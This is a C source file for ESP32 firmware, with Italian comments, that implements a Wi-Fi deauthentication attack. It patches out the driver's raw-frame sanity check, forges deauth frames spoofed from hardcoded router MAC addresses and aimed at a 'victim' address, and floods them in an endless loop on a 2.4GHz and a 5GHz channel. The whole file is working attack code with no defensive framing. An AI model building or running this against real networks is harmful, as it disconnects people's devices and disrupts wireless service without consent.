#include "deauther.h"
#include <stdint.h>
#include <string.h>
#include "deauther.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_wifi_types_generic.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#define PACKET_NUMBER 8 //regolazione impulso di deauth

static const char *TAG = "deauth";

//bypass del sanity_check implementato da espressif nel driver wifi
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

struct _80211_header deauthPacket = {0};

static TaskHandle_t deautherTask_handle = NULL;

void deautherTask(void *args){
    uint8_t is24GHz=1;
    ESP_LOGI(TAG, "DEAUTH IN ESECUZIONE");
 
    while (1) {
        if(is24GHz == 1){
            //2.4GHz
            esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
            uint8_t mac_router[6]  = {0xa4, 0x91, 0xb1, 0x4c, 0x75, 0xc7};
            memcpy(deauthPacket.source, mac_router, 6);
            memcpy(deauthPacket.bssid, mac_router, 6);
            is24GHz--;
        }
        else {
            //5GHz
            esp_wifi_set_channel(100, WIFI_SECOND_CHAN_NONE);
            uint8_t mac_router[6]  = {0xa6, 0x91, 0xb1, 0x4c, 0x75, 0xd0};
            memcpy(deauthPacket.source, mac_router, 6);
            memcpy(deauthPacket.bssid, mac_router, 6);
            is24GHz++;
        }

        vTaskDelay(pdMS_TO_TICKS(3)); //delay che permette un corretto set_channel

        for (uint8_t i = 0; i < PACKET_NUMBER; i++) {
            esp_wifi_80211_tx(WIFI_IF_STA, &deauthPacket, sizeof(deauthPacket), false);
            vTaskDelay(pdMS_TO_TICKS(1)); //delay per non intasare l'interfaccia
        }

        vTaskDelay(pdMS_TO_TICKS(5)); //delay per far svuotare la coda di invio pacchetti
    }
}

void deauth(void){

    deauthPacket.frame_control.protocol_version = 0;
    deauthPacket.frame_control.type = 0;
    deauthPacket.frame_control.subtype = 12;

    uint8_t mac_vittima[6] = {0xfa, 0xff, 0xff, 0xff, 0xff, 0xff}; 
    memcpy(deauthPacket.destination, mac_vittima, 6); 

    deauthPacket.reason_code = 7;

    xTaskCreate(
	deautherTask,
	"deautherTask",
	4096,
	NULL,
	5,
	&deautherTask_handle
    );
}
